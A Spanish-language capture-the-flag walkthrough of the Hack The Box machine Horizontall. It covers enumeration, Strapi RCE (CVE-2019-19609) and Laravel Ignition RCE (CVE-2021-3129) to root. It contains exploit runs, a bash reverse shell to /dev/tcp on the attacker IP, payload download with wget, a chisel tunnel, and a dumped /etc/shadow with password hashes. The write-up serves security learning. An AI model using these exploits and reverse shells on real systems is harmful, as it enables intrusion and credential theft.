---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Horizontall

`Horizontall` es una máquina Linux de dificultad fácil donde solo se exponen los servicios HTTP y SSH. La enumeración del sitio web revela que está construido utilizando el marco Vue JS. Al revisar el código fuente del archivo Javascript, se descubre un nuevo host virtual. Este host contiene el `Strapi Headless CMS` que es vulnerable a dos CVE que permiten a los atacantes potenciales obtener ejecución de código remoto en el sistema como el usuario `strapi`. Luego, después de enumerar los servicios que escuchan solo en localhost en la máquina remota, se descubre una instancia de Laravel. Para acceder al puerto en el que Laravel está escuchando, se utiliza el túnel SSH. El marco Laravel instalado está desactualizado y se ejecuta en modo de depuración. Se puede explotar otro CVE para obtener ejecución de código remoto a través de Laravel como `root`.

<figure><img src="../../.gitbook/assets/Horizontall.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance



```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.105 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-19 12:25 CET
Initiating SYN Stealth Scan at 12:25
Scanning 10.10.11.105 [65535 ports]
Discovered open port 22/tcp on 10.10.11.105
Discovered open port 80/tcp on 10.10.11.105
Completed SYN Stealth Scan at 12:25, 11.95s elapsed (65535 total ports)
Nmap scan report for 10.10.11.105
Host is up, received user-set (0.047s latency).
Scanned at 2025-02-19 12:25:24 CET for 12s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.06 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65549 (2.623MB)
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.105
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p22,80 10.10.11.105 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-19 12:25 CET
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.062s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   92.59 ms 10.10.16.1
2   28.04 ms horizontall.htb (10.10.11.105)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.40 seconds
```



```bash
❯ xsltproc targetedXML > index.html
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/imagen (414).png" alt=""><figcaption></figcaption></figure>



```bash
❯ cat /etc/hosts | grep horizontall
10.10.11.105 horizontall.htb
```



```bash
❯ whatweb http://horizontall.htb
http://horizontall.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0]
```

<figure><img src="../../.gitbook/assets/imagen (415).png" alt=""><figcaption></figcaption></figure>



```bash
❯ wfuzz --hh=194 -c --hc=404,400 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.horizontall.htb" http://horizontall.htb 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://horizontall.htb/
Total requests: 220548

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                              
=====================================================================

000000173:   200        1 L      43 W       901 Ch      "www" 
```



```bash
❯ feroxbuster -u http://horizontall.htb/ -t 200 -C 500,502,404
                                                                                                                                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://horizontall.htb/
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [500, 502, 404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       13w      178c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       13w      194c http://horizontall.htb/js => http://horizontall.htb/js/
301      GET        7l       13w      194c http://horizontall.htb/css => http://horizontall.htb/css/
301      GET        7l       13w      194c http://horizontall.htb/img => http://horizontall.htb/img/
200      GET        1l        5w      720c http://horizontall.htb/css/app.0f40a091.css
200      GET        1l       35w     6796c http://horizontall.htb/favicon.ico
200      GET        2l      394w    18900c http://horizontall.htb/js/app.c68eb462.js
200      GET       10l     2803w   218981c http://horizontall.htb/css/chunk-vendors.55204a1e.css
200      GET       55l    86826w  1190830c http://horizontall.htb/js/chunk-vendors.0e02b89e.js
200      GET        1l       43w      901c http://horizontall.htb/
```





```bash
❯ curl -s -X GET 'http://horizontall.htb/js/app.c68eb462.js' -o app.js
❯ ls -l app.js
.rw-rw-r-- kali kali 18 KB Wed Feb 19 12:33:18 2025  app.js
```



```javascript
❯ js-beautify app.js

...[snip]...
    components: {
        Navbar: v,
        Home: w
    },
    data: function() {
        return {
            reviews: []
        }
    },
    methods: {
        getReviews: function() {
            var t = this;
            r.a.get("http://api-prod.horizontall.htb/reviews").then((function(s) {
                return t.reviews = s.data
            }))
        }
    }
},
```



```bash
❯ cat /etc/hosts | grep horizontall
10.10.11.105 horizontall.htb api-prod.horizontall.htb
```



<figure><img src="../../.gitbook/assets/5165_vmware_mjtS9q1D8h.png" alt=""><figcaption></figcaption></figure>



```bash
❯ feroxbuster -u http://api-prod.horizontall.htb/ -t 200 -C 500,502,404
                                                                                                                                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://api-prod.horizontall.htb/
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [500, 502, 404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        3w       60c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       19l       33w      413c http://api-prod.horizontall.htb/
200      GET       16l      101w      854c http://api-prod.horizontall.htb/Admin
200      GET      223l     1051w     9230c http://api-prod.horizontall.htb/admin/runtime~main.d078dc17.js
403      GET        1l        1w       60c http://api-prod.horizontall.htb/users
200      GET       16l      101w      854c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       16l      101w      854c http://api-prod.horizontall.htb/ADMIN
200      GET        1l       21w      507c http://api-prod.horizontall.htb/reviews
200      GET        1l        1w       90c http://api-prod.horizontall.htb/admin/layout
403      GET        1l        1w       60c http://api-prod.horizontall.htb/admin/plugins
403      GET        1l        1w       60c http://api-prod.horizontall.htb/Users
200      GET        0l        0w  7001634c http://api-prod.horizontall.htb/admin/main.da91597e.chunk.js
200      GET       16l      101w      854c http://api-prod.horizontall.htb/admin
200      GET        1l        1w      144c http://api-prod.horizontall.htb/admin/init
200      GET        1l        1w       90c http://api-prod.horizontall.htb/admin/Layout
```



<figure><img src="../../.gitbook/assets/imagen (416).png" alt=""><figcaption></figcaption></figure>



codigo fuente

```bash
❯ curl -s -X GET 'http://api-prod.horizontall.htb/admin/main.da91597e.chunk.js' | grep strapi-plugin | head -n5
module.exports = JSON.parse("{\"_from\":\"strapi-plugin-content-type-builder@3.0.0-beta.17.4\"
```



```bash
❯ searchsploit Strapi
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                      |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                                                                                                                  | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                                                                                                                                | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                                                                                          | multiple/webapps/50239.py
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)                                                                                                                            | nodejs/webapps/50716.rb
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```



{% embed url="https://www.incibe.es/index.php/incibe-cert/alerta-temprana/vulnerabilidades/cve-2019-19609" %}

{% hint style="danger" %}
El framework Strapi versiones anteriores a 3.0.0-beta.17.8, es vulnerable a una Ejecución de Código Remota en los componentes del Plugin de Instalación y Desinstalación del panel de Administración, ya que no sanea el nombre del plugin y los atacantes pueden inyectar comandos de shell arbitrarios para ser ejecutados mediante la función execa.
{% endhint %}





{% embed url="https://github.com/glowbase/CVE-2019-19609" %}

```bash
❯ git clone https://github.com/glowbase/CVE-2019-19609; cd CVE-2019-19609
Clonando en 'CVE-2019-19609'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 18 (delta 4), reused 13 (delta 3), pack-reused 0 (from 0)
Recibiendo objetos: 100% (18/18), 5.13 KiB | 5.13 MiB/s, listo.
Resolviendo deltas: 100% (4/4), listo.
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```



```bash
❯ python3 exploit.py http://api-prod.horizontall.htb 10.10.16.3 443
========================================================
|    STRAPI REMOTE CODE EXECUTION (CVE-2019-19609)     |
========================================================
[+] Checking Strapi CMS version
[+] Looks like this exploit should work!
[+] Executing exploit
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.105] 60270
/bin/sh: 0: can't access tty; job control turned off
$ whoami
strapi
$ ls -l /home 
total 4
drwxr-xr-x 8 developer developer 4096 Aug  2  2021 developer
$ cat /home/developer/user.txt
37f728736ed1e053d9e23928a793a5b6
```



```bash
$ script /dev/null -c bash
Script started, file is /dev/null
strapi@horizontall:~/myapi$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo;fg
[1]  + continued  nc -nlvp 443
                              reset xterm
strapi@horizontall:~/myapi$ export TERM=xterm
strapi@horizontall:~/myapi$ export SHELL=bash
strapi@horizontall:~/myapi$ stty rows 46 columns 230
```



```bash
strapi@horizontall:~/myapi$ netstat -ano | grep LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
```



```bash
strapi@horizontall:~/myapi$ curl 127.0.0.1:8000
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Laravel</title>
```





```bash
❯ ls -l chisel
.rwxr-xr-x kali kali 8.9 MB Sun Feb 16 03:43:15 2025  chisel
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```bash
strapi@horizontall:/tmp$ wget 10.10.16.3/chisel; chmod +x chisel
--2025-02-19 04:52:38--  http://10.10.16.3/chisel
Connecting to 10.10.16.3:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9371800 (8.9M) [application/octet-stream]
Saving to: ‘chisel’

chisel            100%[==========================>]   8.94M  8.63MB/s    in 1.0s    

2025-02-19 04:52:39 (8.63 MB/s) - ‘chisel’ saved [9371800/9371800]
```



```bash
❯ ./chisel server --reverse -p 1234
2025/02/19 12:59:49 server: Reverse tunnelling enabled
2025/02/19 12:59:49 server: Fingerprint qrzwT378tyR4YNA2Jfg6h7jmt/4JDam5pCJFQ/67+og=
2025/02/19 12:59:49 server: Listening on http://0.0.0.0:1234
```



```bash
strapi@horizontall:/tmp$ ./chisel client 10.10.16.3:1234 R:8000:127.0.0.1:8000
2025/02/19 04:56:49 client: Connecting to ws://10.10.16.3:1234
2025/02/19 04:56:50 client: Connected (Latency 31.034143ms)
```



<figure><img src="../../.gitbook/assets/imagen (417).png" alt=""><figcaption></figcaption></figure>



```bash
❯ gobuster dir -u http://localhost:8000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -b 503,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:8000/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,503
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/profiles             (Status: 500) [Size: 616202]
```



<figure><img src="../../.gitbook/assets/imagen (420).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (418).png" alt=""><figcaption></figcaption></figure>



{% embed url="https://www.ambionics.io/blog/laravel-debug-rce" %}



```bash
❯ git clone https://github.com/ambionics/laravel-exploits; cd laravel-exploits
Clonando en 'laravel-exploits'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 9 (delta 0), reused 3 (delta 0), pack-reused 0 (from 0)
Recibiendo objetos: 100% (9/9), listo.
```



```bash
❯ php -d'phar.readonly=0' /opt/phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system id
```



```bash
❯ python3 laravel-ignition-rce.py http://localhost:8000 /tmp/exploit.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
uid=0(root) gid=0(root) groups=0(root)
--------------------------
+ Logs cleared
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```



```bash
❯ php -d'phar.readonly=0' /opt/phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.3/443 0>&1'"
❯ python3 laravel-ignition-rce.py http://localhost:8000 /tmp/exploit.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.105] 49394
bash: cannot set terminal process group (4676): Inappropriate ioctl for device
bash: no job control in this shell
root@horizontall:/home/developer/myproject/public# cat /root/root.txt
cat /root/root.txt
2bdca81209a4ac4cea748c2bad0fa44d
```





{% embed url="https://github.com/knqyf263/CVE-2021-3129" %}

```bash
❯ wget https://raw.githubusercontent.com/knqyf263/CVE-2021-3129/refs/heads/main/attacker/exploit.py
--2025-02-19 13:35:00--  https://raw.githubusercontent.com/knqyf263/CVE-2021-3129/refs/heads/main/attacker/exploit.py
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.110.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 3976 (3,9K) [text/plain]
Grabando a: «exploit.py»

exploit.py                                                100%[===================================================================================================================================>]   3,88K  --.-KB/s    en 0s      

2025-02-19 13:35:00 (48,0 MB/s) - «exploit.py» guardado [3976/3976]
```



```bash
❯ python3 exploit.py
[*] Try to use monolog_rce1 for exploitation.
[+] PHPGGC found. Generating payload and deploy it to the target
[*] Result:
root:$6$rGxQBZV9$SbzCXDzp1MEx7xxXYuV5voXCy4k9OdyCDbyJcWuETBujfMrpfVtTXjbx82bTNlPK6Ayg8SqKMYgVlYukVOKJz1:18836:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18772:0:99999:7:::
developer:$6$XWN/h2.z$Y6PfR1h7vDa5Hu8iHl4wo5PkWe/HWqdmDdWaCECJjvta71eNYMf9BhHCHiQ48c9FMlP4Srv/Dp6LtcbjrcVW40:18779:0:99999:7:::
mysql:!:18772:0:99999:7:::
strapi:$6$a9mzQsIs$YENaG2S/H/9aqnHRl.6Qg68lCYU9/nDxvpV0xYOn6seH.JSGtU6zqu0OhR6qy8bATowftM4qBJ2ZA5x9EDSUR.:18782:0:99999:7:::
```
